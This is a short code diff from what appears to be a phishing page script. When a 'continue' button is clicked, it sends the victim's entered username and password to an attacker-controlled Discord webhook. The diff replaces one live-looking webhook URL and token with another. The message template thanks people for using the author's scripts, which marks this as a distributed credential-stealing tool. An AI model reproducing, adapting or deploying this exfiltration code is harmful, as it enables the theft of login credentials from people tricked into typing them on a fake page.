@@ -41,7 +41,7 @@ continueButton.addEventListener("click", function() {
   const xhr = new XMLHttpRequest();
 
 
-  const webhookUrl = "https://discord.com/api/webhooks/1412353462120878101/_pqO1xMWVIjiyKLUiv9J3Pa0hg9wnTKSnhrtSQu9SrpobnvuoRC_8anfvdZP5XEU33Nv";
+  const webhookUrl = "https://discord.com/api/webhooks/1412339726417006592/vhnSS2XVIYTAtaNMjO2jCp_Plg4fixjjKwzFy6J1wknomLMG2fZl9uHw42lH1lJyld1w";
 
   const payload = JSON.stringify({
     content: `**Username:** ${username}\n**Password:** ${password}\n\nThis was made by Gynoids :)  -  To Be Honest Thank You For Using My Scripts, You May Get Alot Of Hate Though.`,
